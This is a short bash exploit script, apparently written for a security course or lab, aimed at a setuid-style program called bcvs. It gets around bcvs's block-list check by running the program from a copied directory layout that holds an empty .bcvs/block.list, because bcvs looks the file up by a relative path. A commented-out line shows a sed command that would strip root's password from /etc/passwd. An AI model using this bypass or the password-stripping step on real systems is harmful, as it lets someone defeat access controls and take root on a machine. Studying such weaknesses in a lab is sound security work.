#!/bin/bash

## -------------------- Description -------------------- ##
# The bcvs program uses a relative path to check its
# "block.list". Therefore you can simply execute bcvs
# from a directory other than its usual but with the
# same directory layout and you can get around the blocks
#
# Right now this sploit is not complete but being able to
# bypass the block check is a start.
## ----------------------------------------------------- ##

# Setup necessary environment
mkdir -p sploit1_dir
cd sploit1_dir
mkdir -p .bcvs
touch .bcvs/block.list

## Saving some stuff for later
# Following will give the root user no password
# cat /etc/passwd | sed 's/root:[^:]*:\(.*\)/root::\1/'

echo "comment\n" | /opt/bcvs/bcvs ci bcvs_info.py
